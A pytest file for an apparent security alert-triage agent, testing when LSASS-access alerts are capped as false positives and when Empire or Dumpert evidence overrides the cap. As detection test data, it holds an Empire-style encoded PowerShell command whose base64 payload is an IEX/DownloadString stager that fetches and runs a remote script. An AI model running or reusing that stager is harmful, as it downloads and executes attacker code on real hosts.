"""EXP-002 lever 6: LSASS-access FP ceiling without dump corroboration.

DR-017 Option A: Empire ``-enc`` PowerShell + whoami/C2 child skips the ceiling.
"""

from __future__ import annotations

from alert2attack.agent.lsass_fp import (
    apply_lsass_fp_ceiling,
    has_lsass_dump_corroboration,
    has_lsass_soft_dump_adjacent_corroboration,
    is_lsass_fp_window,
)
from alert2attack.domain.alert import Alert
from alert2attack.domain.casefile import ActionRecommendation, CaseFile, Claim, NextAction, Verdict
from alert2attack.domain.events import Event, EventKind
from alert2attack.domain.scenario import SCENARIOS_ROOT, iter_scenarios, load_scenario

# Same payload as tests/knowledge/test_powershell.py (IEX + DownloadString).
_ENC_B64 = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBu"
    "AGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEA"
    "LgBwAHMAMQAnACkA"
)
_EMPIRE_ENC = (
    '"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -noP -sta -w 1 -enc ' + _ENC_B64
)
_PS_IMAGE = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def _alert(*, rule_id: str = "win_susp_lsass_access", trigger: str = "ev-0001") -> Alert:
    return Alert(
        alert_id="alr-test",
        host="WORKSTATION5",
        fired_at="2020-10-19T02:56:14.283000Z",
        rule_id=rule_id,
        rule_title="LSASS Memory Access",
        severity="high",
        trigger_event_id=trigger,
    )


def _access(*, eid: str, image: str, target: str, granted: str) -> Event:
    return Event(
        event_id=eid,
        kind=EventKind.PROCESS_ACCESS,
        ts="2020-10-19T02:56:14.283000Z",
        host="WORKSTATION5",
        image=image,
        target_image=target,
        details=granted,
    )


def _create(
    *,
    eid: str,
    image: str,
    command: str = "",
    pid: int = 6772,
    ppid: int | None = None,
    parent_image: str | None = None,
    parent_command_line: str | None = None,
) -> Event:
    return Event(
        event_id=eid,
        kind=EventKind.PROCESS_CREATE,
        ts="2020-10-19T02:56:14.283000Z",
        host="WORKSTATION5",
        image=image,
        command_line=command or image.split("\\")[-1],
        pid=pid,
        ppid=ppid,
        parent_image=parent_image,
        parent_command_line=parent_command_line,
    )


def _net(*, eid: str, image: str, pid: int, dest_ip: str = "10.10.10.5", dest_port: int = 80) -> Event:
    return Event(
        event_id=eid,
        kind=EventKind.NETWORK_CONNECT,
        ts="2020-10-19T02:56:14.283000Z",
        host="WORKSTATION5",
        image=image,
        pid=pid,
        dest_ip=dest_ip,
        dest_port=dest_port,
    )


def _limited_lsass(*, eid: str = "ev-0042") -> Event:
    return _access(
        eid=eid,
        image="C:\\Windows\\System32\\svchost.exe",
        target="C:\\Windows\\System32\\lsass.exe",
        granted="0x1000",
    )


def _empire_whoami_child() -> Event:
    return _create(
        eid="ev-0018",
        image="C:\\Windows\\System32\\whoami.exe",
        command='"C:\\windows\\system32\\whoami.exe" /user',
        pid=6504,
        ppid=1648,
        parent_image=_PS_IMAGE,
        parent_command_line=_EMPIRE_ENC,
    )


def _cf(*, verdict: str = "malicious", action: NextAction = NextAction.ISOLATE_HOST) -> CaseFile:
    return CaseFile(
        verdict=verdict,
        confidence="high",
        summary="LSASS was accessed; containment is recommended.",
        next_actions=[
            ActionRecommendation(
                action=action,
                rationale=Claim(text="lsass access", evidence=["ev-0001"]),
            )
        ],
    )


def test_limited_svchost_lsass_access_is_fp_window() -> None:
    events = [
        _access(
            eid="ev-0001",
            image="C:\\Windows\\System32\\svchost.exe",
            target="C:\\Windows\\System32\\lsass.exe",
            granted="0x1000",
        )
    ]
    assert has_lsass_dump_corroboration(events) is False
    assert is_lsass_fp_window(_alert(), events) is True


def test_dumpert_high_access_is_not_fp_window() -> None:
    events = [
        _create(eid="ev-0029", image="C:\\tools\\Outflank-Dumpert.exe", command="Outflank-Dumpert.exe"),
        _access(
            eid="ev-0043",
            image="C:\\tools\\Outflank-Dumpert.exe",
            target="C:\\Windows\\System32\\lsass.exe",
            granted="0x1fffff",
        ),
    ]
    assert has_lsass_dump_corroboration(events) is True
    assert is_lsass_fp_window(_alert(), events) is False


def test_ceiling_caps_malicious_isolate_on_fp_window() -> None:
    events = [
        _access(
            eid="ev-0001",
            image="C:\\Windows\\System32\\VBoxService.exe",
            target="C:\\Windows\\System32\\lsass.exe",
            granted="0x1400",
        )
    ]
    out = apply_lsass_fp_ceiling(_cf(), events, _alert())
    assert out.verdict is Verdict.LIKELY_BENIGN
    assert all(a.action is not NextAction.ISOLATE_HOST for a in out.next_actions)
    assert all(a.action is not NextAction.KILL_PROCESS for a in out.next_actions)
    assert any(a.action is NextAction.MONITOR for a in out.next_actions)
    assert any("lsass" in q.lower() for q in out.open_questions)


def test_ceiling_leaves_dumpert_and_non_lsass_alerts() -> None:
    dump_events = [
        _create(eid="ev-0029", image="C:\\tools\\Outflank-Dumpert.exe"),
        _access(
            eid="ev-0043",
            image="C:\\tools\\Outflank-Dumpert.exe",
            target="C:\\Windows\\System32\\lsass.exe",
            granted="0x1fffff",
        ),
    ]
    dump_out = apply_lsass_fp_ceiling(_cf(), dump_events, _alert())
    assert dump_out.verdict is Verdict.MALICIOUS
    assert dump_out.next_actions[0].action is NextAction.ISOLATE_HOST

    other = apply_lsass_fp_ceiling(
        _cf(),
        dump_events,
        _alert(rule_id="win_powershell_encoded_command"),
    )
    assert other.verdict is Verdict.MALICIOUS


def test_catalog_likely_benign_lsass_alerts_have_no_dump_corroboration() -> None:
    benign = []
    dumpert_ok = False
    logonpasswords_ok = False
    for scenario in iter_scenarios(SCENARIOS_ROOT):
        if scenario.alert.rule_id != "win_susp_lsass_access":
            continue
        assert scenario.gold is not None
        dump = has_lsass_dump_corroboration(scenario.events)
        soft = has_lsass_soft_dump_adjacent_corroboration(scenario.events)
        if scenario.gold.verdict == "likely_benign":
            assert dump is False, scenario.scenario_id
            assert soft is False, scenario.scenario_id
            assert is_lsass_fp_window(scenario.alert, scenario.events) is True
            benign.append(scenario.scenario_id)
        if scenario.scenario_id == "otrf_cmd_lsass_memory_dumpert_syscalls":
            assert dump is True
            dumpert_ok = True
        if scenario.scenario_id == "otrf_empire_mimikatz_logonpasswords":
            assert dump is False
            assert soft is True
            assert is_lsass_fp_window(scenario.alert, scenario.events) is False
            logonpasswords_ok = True
    assert benign
    assert dumpert_ok
    assert logonpasswords_ok


def test_empire_enc_plus_whoami_child_skips_ceiling() -> None:
    events = [_limited_lsass(), _empire_whoami_child()]
    assert has_lsass_dump_corroboration(events) is False
    assert has_lsass_soft_dump_adjacent_corroboration(events) is True
    assert is_lsass_fp_window(_alert(), events) is False
    out = apply_lsass_fp_ceiling(_cf(), events, _alert())
    assert out.verdict is Verdict.MALICIOUS
    assert out.next_actions[0].action is NextAction.ISOLATE_HOST


def test_encoded_ps_without_whoami_or_c2_still_caps() -> None:
    events = [
        _limited_lsass(),
        _create(
            eid="ev-0100",
            image=_PS_IMAGE,
            command=_EMPIRE_ENC,
            pid=1648,
        ),
    ]
    assert has_lsass_soft_dump_adjacent_corroboration(events) is False
    assert is_lsass_fp_window(_alert(), events) is True
    out = apply_lsass_fp_ceiling(_cf(), events, _alert())
    assert out.verdict is Verdict.LIKELY_BENIGN
    assert all(a.action is not NextAction.ISOLATE_HOST for a in out.next_actions)


def test_whoami_without_encoded_ps_still_caps() -> None:
    events = [
        _limited_lsass(),
        _create(
            eid="ev-0101",
            image="C:\\Windows\\System32\\whoami.exe",
            command='"C:\\windows\\system32\\whoami.exe" /user',
            pid=6504,
            ppid=1648,
            parent_image=_PS_IMAGE,
            parent_command_line="powershell.exe -NoProfile -File C:\\scripts\\backup.ps1",
        ),
    ]
    assert has_lsass_soft_dump_adjacent_corroboration(events) is False
    assert is_lsass_fp_window(_alert(), events) is True
    out = apply_lsass_fp_ceiling(_cf(), events, _alert())
    assert out.verdict is Verdict.LIKELY_BENIGN


def test_encoded_ps_plus_c2_network_skips_ceiling() -> None:
    events = [
        _limited_lsass(),
        _create(eid="ev-0100", image=_PS_IMAGE, command=_EMPIRE_ENC, pid=1648),
        _net(eid="ev-0102", image=_PS_IMAGE, pid=1648),
    ]
    assert has_lsass_dump_corroboration(events) is False
    assert has_lsass_soft_dump_adjacent_corroboration(events) is True
    assert is_lsass_fp_window(_alert(), events) is False
    out = apply_lsass_fp_ceiling(_cf(), events, _alert())
    assert out.verdict is Verdict.MALICIOUS


def test_encoded_ps_plus_unrelated_network_still_caps() -> None:
    events = [
        _limited_lsass(),
        _create(eid="ev-0100", image=_PS_IMAGE, command=_EMPIRE_ENC, pid=1648),
        _net(eid="ev-0103", image="C:\\Program Files\\Google\\Chrome\\chrome.exe", pid=4400),
    ]
    assert has_lsass_soft_dump_adjacent_corroboration(events) is False
    assert is_lsass_fp_window(_alert(), events) is True


def test_decoded_stager_fingerprints_alone_do_not_skip() -> None:
    """IEX/DownloadString in the decoded -enc payload is not a sole skip signal."""
    events = [
        _limited_lsass(),
        _create(eid="ev-0100", image=_PS_IMAGE, command=_EMPIRE_ENC, pid=1648),
    ]
    assert has_lsass_soft_dump_adjacent_corroboration(events) is False
    assert is_lsass_fp_window(_alert(), events) is True


def test_undecodable_enc_plus_whoami_still_skips() -> None:
    """decode_powershell fingerprints are optional; -enc + whoami child is enough."""
    events = [
        _limited_lsass(),
        _create(
            eid="ev-0018",
            image="C:\\Windows\\System32\\whoami.exe",
            command='"C:\\windows\\system32\\whoami.exe" /user',
            pid=6504,
            ppid=1648,
            parent_image=_PS_IMAGE,
            parent_command_line=(
                '"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
                "-noP -sta -w 1 -enc !!!notbase64!!!"
            ),
        ),
    ]
    assert has_lsass_soft_dump_adjacent_corroboration(events) is True
    assert is_lsass_fp_window(_alert(), events) is False


def test_logonpasswords_boxed_events_skip_ceiling() -> None:
    scenario = load_scenario(SCENARIOS_ROOT / "otrf_empire_mimikatz_logonpasswords")
    assert has_lsass_dump_corroboration(scenario.events) is False
    assert has_lsass_soft_dump_adjacent_corroboration(scenario.events) is True
    assert is_lsass_fp_window(scenario.alert, scenario.events) is False
    out = apply_lsass_fp_ceiling(_cf(), scenario.events, scenario.alert)
    assert out.verdict is Verdict.MALICIOUS
    assert out.next_actions[0].action is NextAction.ISOLATE_HOST
